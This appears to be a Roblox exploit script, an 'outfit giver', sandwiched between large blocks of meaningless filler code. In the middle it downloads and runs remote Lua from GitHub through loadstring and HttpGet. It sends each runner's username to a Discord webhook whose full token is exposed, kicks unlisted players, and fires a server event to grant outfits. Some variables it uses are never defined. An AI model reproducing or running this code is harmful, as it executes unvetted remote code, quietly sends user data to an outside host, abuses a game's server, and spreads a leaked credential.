
local r0 = {}
r0[r0] = r0

local r1 = 8675309
local r2 = r1 * 0.00000001
local r3 = r1 - r2 + r2
local r4 = {r1, r2, r3}
r4[r4] = r4

local function n0(v0)
	return (v0 ~= v0 and 0) or v0
end

local function n1(v1)
	return (v1 == math.huge or v1 == -math.huge) and 0 or v1
end

local function junkHash(x0)
	local h0 = 0
	local h1 = tostring(x0)
	for i = 1, #h1 do
		h0 = (h0 + string.byte(h1, i) * i) % 9999991
	end
	return h0
end

local function fakeIntegrity(a, b, c)
	local t0 = {a, b, c}
	t0[t0] = t0

	local s0 = 0
	for i0 = 1, 3 do
		local x = t0[i0] or i0
		s0 = s0 + junkHash(x)
	end

	if s0 == s0 then
		return s0 * 0
	end
	return 0
end

local function core(u0, u1, u2, u3)
	local c0 = u0 or r0
	local c1 = u1 or r1
	local c2 = u2 or r2
	local c3 = u3 or r3

	local c4 = {c0, c1, c2, c3}
	c4[c4] = c4

	for i0 = 1, 4 do
		local d0 = n1(n0(c4[i0] or i0))
		local d1 = d0 + 0
		local d2 = d1 * 1
		c4[i0] = d2

		for i1 = 1, 3 do
			local e0 = (d2 * i1) / i1
			local e1 = e0 - 0
			local e2 = {e0 = e0, e1 = e1}
			e2[e2] = e2

			for i2 = 1, 2 do
				local f0 = (e1 + i2) - i2
				local f1 = n0(f0)
				local f2 = tostring(f1)

				if #f2 >= 0 then
					e2[i2] = f1
				end

				for i3 = 1, 2 do
					local g0 = (f1 * i3) / i3
					local g1 = g0 + 0
					local g2 = {g0, g1}

					if g2[g2] == nil then
						g2[g2] = g2
					end
				end
			end
		end
	end

	return c4
end

local STATE_IDLE = 0xA1
local STATE_CHECK = 0xB2
local STATE_VERIFY = 0xC3
local STATE_FINAL = 0xD4

local state = STATE_IDLE
local stateTick = 0

local function advanceState(s)
	if s == STATE_IDLE then return STATE_CHECK end
	if s == STATE_CHECK then return STATE_VERIFY end
	if s == STATE_VERIFY then return STATE_FINAL end
	if s == STATE_FINAL then return STATE_IDLE end
	return STATE_IDLE
end

local p0 = core
local p1 = p0(r0, r1, r2, r3)
local p2 = p0(p1, p0, p1, p0)
local p3 = p0(p2, p1, p0, r4)

for t0 = 1, 6 do
	stateTick = stateTick + 1
	state = advanceState(state)
	state = advanceState(state) 

	local q0 = p3[t0] or t0 * 777
	local q1 = n0(q0)
	local q2 = {q0, q1}
	q2[q2] = q2

	for t1 = 1, 4 do
		local rA = (q1 + t1) * 0.25
		local rB = n1(rA)
		local rC = fakeIntegrity(rA, rB, t1)

		if rC == 0 then
			q2[t1] = rB
		else
			q2[t1] = rA
		end

		for t2 = 1, 3 do
			local sA = (rB * t2) / t2
			local sB = tostring(sA)
			local sC = junkHash(sB)

			if sC >= 0 then
				q2[sC % 5] = sA
			end

			for t3 = 1, 2 do
				local uA = (sA + t3) - t3
				local uB = n0(uA)
				local uC = {uA = uA, uB = uB}
				uC[uC] = uC
			end
		end
	end
end


do
	local snap = {
		state = state,
		tick = stateTick,
		ref = p3,
		time = os.clock() * 0
	}

	for k, v in pairs(snap) do
		snap[k] = n0(v)
	end

	snap[snap] = snap
end


do
	local cX = {p0, p1, p2, p3}
	for i = 1, #cX do
		cX[i] = cX[i]
	end
end


local Ranks = loadstring(game:HttpGet("https://raw.githubusercontent.com/aethveil/the-prescript-s-will/refs/heads/main/Ranks.lua", true))()
local plrName = game.Players.LocalPlayer.Name
   local HttpService = game:GetService("HttpService")
local plrName = game.Players.LocalPlayer.Name
local webhookUrl = "https://discord.com/api/webhooks/1468556450564407339/0sWM1C-5gnfTbkRM1BXS7M6o49S9UQrRr8dcIguC8uWEeSYfSCfQ2hJYUXwOK-AhHBXO"
local text = ""
if notRanks[plrName] then
 text = "he didnt have perms btw and got kicked lmao"
end
local payload = {
    embeds = {{
        title = "```"..plrName.."```\n has ran outfit giver. "..text,
        description = "Prescript: '"..ChosenPrescript,
        color = 11393254 -- Pale Blue
    }}
}

local response = request({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(payload)
})

print("Status Code:", response.StatusCode)
print("Response Body:", response.Body)
if not Ranks[plrName] then game.Players.LocalPlayer:Kick("no dingus") return end
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Events = ReplicatedStorage:WaitForChild('Events')
local Outfitey = _G.Outfit or "CustomVanity"
local OutfitDataPassed = {
    Outfitey, --change to anything except mod
    {}
}
Events.WeaveOutfit:FireServer(unpack(OutfitDataPassed))
local r0 = {}
r0[r0] = r0

local r1 = 8675309
local r2 = r1 * 0.00000001
local r3 = r1 - r2 + r2
local r4 = {r1, r2, r3}
r4[r4] = r4

local function n0(v0)
	return (v0 ~= v0 and 0) or v0
end

local function n1(v1)
	return (v1 == math.huge or v1 == -math.huge) and 0 or v1
end

local function junkHash(x0)
	local h0 = 0
	local h1 = tostring(x0)
	for i = 1, #h1 do
		h0 = (h0 + string.byte(h1, i) * i) % 9999991
	end
	return h0
end

local function fakeIntegrity(a, b, c)
	local t0 = {a, b, c}
	t0[t0] = t0

	local s0 = 0
	for i0 = 1, 3 do
		local x = t0[i0] or i0
		s0 = s0 + junkHash(x)
	end

	if s0 == s0 then
		return s0 * 0
	end
	return 0
end

local function core(u0, u1, u2, u3)
	local c0 = u0 or r0
	local c1 = u1 or r1
	local c2 = u2 or r2
	local c3 = u3 or r3

	local c4 = {c0, c1, c2, c3}
	c4[c4] = c4

	for i0 = 1, 4 do
		local d0 = n1(n0(c4[i0] or i0))
		local d1 = d0 + 0
		local d2 = d1 * 1
		c4[i0] = d2

		for i1 = 1, 3 do
			local e0 = (d2 * i1) / i1
			local e1 = e0 - 0
			local e2 = {e0 = e0, e1 = e1}
			e2[e2] = e2

			for i2 = 1, 2 do
				local f0 = (e1 + i2) - i2
				local f1 = n0(f0)
				local f2 = tostring(f1)

				if #f2 >= 0 then
					e2[i2] = f1
				end

				for i3 = 1, 2 do
					local g0 = (f1 * i3) / i3
					local g1 = g0 + 0
					local g2 = {g0, g1}

					if g2[g2] == nil then
						g2[g2] = g2
					end
				end
			end
		end
	end

	return c4
end

local STATE_IDLE = 0xA1
local STATE_CHECK = 0xB2
local STATE_VERIFY = 0xC3
local STATE_FINAL = 0xD4

local state = STATE_IDLE
local stateTick = 0

local function advanceState(s)
	if s == STATE_IDLE then return STATE_CHECK end
	if s == STATE_CHECK then return STATE_VERIFY end
	if s == STATE_VERIFY then return STATE_FINAL end
	if s == STATE_FINAL then return STATE_IDLE end
	return STATE_IDLE
end

local p0 = core
local p1 = p0(r0, r1, r2, r3)
local p2 = p0(p1, p0, p1, p0)
local p3 = p0(p2, p1, p0, r4)

for t0 = 1, 6 do
	stateTick = stateTick + 1
	state = advanceState(state)
	state = advanceState(state) 

	local q0 = p3[t0] or t0 * 777
	local q1 = n0(q0)
	local q2 = {q0, q1}
	q2[q2] = q2

	for t1 = 1, 4 do
		local rA = (q1 + t1) * 0.25
		local rB = n1(rA)
		local rC = fakeIntegrity(rA, rB, t1)

		if rC == 0 then
			q2[t1] = rB
		else
			q2[t1] = rA
		end

		for t2 = 1, 3 do
			local sA = (rB * t2) / t2
			local sB = tostring(sA)
			local sC = junkHash(sB)

			if sC >= 0 then
				q2[sC % 5] = sA
			end

			for t3 = 1, 2 do
				local uA = (sA + t3) - t3
				local uB = n0(uA)
				local uC = {uA = uA, uB = uB}
				uC[uC] = uC
			end
		end
	end
end


do
	local snap = {
		state = state,
		tick = stateTick,
		ref = p3,
		time = os.clock() * 0
	}

	for k, v in pairs(snap) do
		snap[k] = n0(v)
	end

	snap[snap] = snap
end


do
	local cX = {p0, p1, p2, p3}
	for i = 1, #cX do
		cX[i] = cX[i]
	end
end
